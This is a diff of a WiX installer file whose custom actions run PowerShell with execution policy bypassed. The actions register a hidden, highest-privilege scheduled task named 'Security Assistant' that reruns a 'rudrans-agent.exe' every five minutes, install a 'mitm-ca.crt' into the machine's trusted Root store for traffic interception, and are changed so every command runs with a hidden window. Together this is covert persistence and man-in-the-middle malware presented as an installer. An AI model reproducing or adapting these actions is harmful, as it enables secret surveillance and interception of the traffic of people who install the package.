@@ -27,7 +27,7 @@
     <CustomAction
       Id="RegisterRudransTask"
       Directory="INSTALLFOLDER"
-      ExeCommand='powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "&amp; { $exe = (Get-ChildItem -Path \"[INSTALLFOLDER]\" -Filter rudrans-agent.exe -Recurse | Select-Object -First 1).FullName; if (-not $exe) { exit 0 }; Unregister-ScheduledTask -TaskName \"Rudrans Agent\" -TaskPath \"\\Rudrans\\\" -Confirm:$false -ErrorAction SilentlyContinue; $action = New-ScheduledTaskAction -Execute $exe; $boot = New-ScheduledTaskTrigger -AtStartup; $logon = New-ScheduledTaskTrigger -AtLogOn; $repeat = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue); $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero); $principal = New-ScheduledTaskPrincipal -GroupId \"S-1-5-32-545\" -RunLevel Highest; Register-ScheduledTask -TaskName \"Security Assistant\" -TaskPath \"\\SecurityAssistant\\\" -Action $action -Trigger @($boot,$logon,$repeat) -Settings $settings -Principal $principal -Force }"'
+      ExeCommand='powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "&amp; { $exe = (Get-ChildItem -Path \"[INSTALLFOLDER]\" -Filter rudrans-agent.exe -Recurse | Select-Object -First 1).FullName; if (-not $exe) { exit 0 }; Unregister-ScheduledTask -TaskName \"Rudrans Agent\" -TaskPath \"\\Rudrans\\\" -Confirm:$false -ErrorAction SilentlyContinue; $action = New-ScheduledTaskAction -Execute $exe; $boot = New-ScheduledTaskTrigger -AtStartup; $logon = New-ScheduledTaskTrigger -AtLogOn; $repeat = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue); $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero); $principal = New-ScheduledTaskPrincipal -GroupId \"S-1-5-32-545\" -RunLevel Highest; Register-ScheduledTask -TaskName \"Security Assistant\" -TaskPath \"\\SecurityAssistant\\\" -Action $action -Trigger @($boot,$logon,$repeat) -Settings $settings -Principal $principal -Force }"'
       Execute="deferred"
       Impersonate="no"
       Return="ignore" />
@@ -38,7 +38,7 @@
     <CustomAction
       Id="UnregisterRudransTask"
       Directory="INSTALLFOLDER"
-      ExeCommand='powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Unregister-ScheduledTask -TaskName \"Security Assistant\" -TaskPath \"\\SecurityAssistant\\\" -Confirm:$false -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"Rudrans Agent\" -TaskPath \"\\Rudrans\\\" -Confirm:$false -ErrorAction SilentlyContinue"'
+      ExeCommand='powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Unregister-ScheduledTask -TaskName \"Security Assistant\" -TaskPath \"\\SecurityAssistant\\\" -Confirm:$false -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName \"Rudrans Agent\" -TaskPath \"\\Rudrans\\\" -Confirm:$false -ErrorAction SilentlyContinue"'
       Execute="deferred"
       Impersonate="no"
       Return="ignore" />
@@ -60,7 +60,7 @@
     <CustomAction
       Id="InstallMitmRootCert"
       Directory="INSTALLFOLDER"
-      ExeCommand='powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "&amp; { $cert = (Get-ChildItem -Path \"[INSTALLFOLDER]\" -Filter mitm-ca.crt -Recurse | Select-Object -First 1).FullName; if ($cert) { &amp; certutil.exe -f -addstore Root $cert | Out-Null } }"'
+      ExeCommand='powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "&amp; { $cert = (Get-ChildItem -Path \"[INSTALLFOLDER]\" -Filter mitm-ca.crt -Recurse | Select-Object -First 1).FullName; if ($cert) { &amp; certutil.exe -f -addstore Root $cert | Out-Null } }"'
       Execute="deferred"
       Impersonate="no"
       Return="ignore" />
@@ -68,7 +68,7 @@
     <CustomAction
       Id="RemoveMitmRootCert"
       Directory="INSTALLFOLDER"
-      ExeCommand='powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "&amp; { Get-ChildItem -Path Cert:\\LocalMachine\\Root | Where-Object { $_.Subject -match \"Wellness Extract Root CA\" } | ForEach-Object { Remove-Item -Path $_.PSPath -Force -ErrorAction SilentlyContinue } }"'
+      ExeCommand='powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "&amp; { Get-ChildItem -Path Cert:\\LocalMachine\\Root | Where-Object { $_.Subject -match \"Wellness Extract Root CA\" } | ForEach-Object { Remove-Item -Path $_.PSPath -Force -ErrorAction SilentlyContinue } }"'
       Execute="deferred"
       Impersonate="no"
       Return="ignore" />
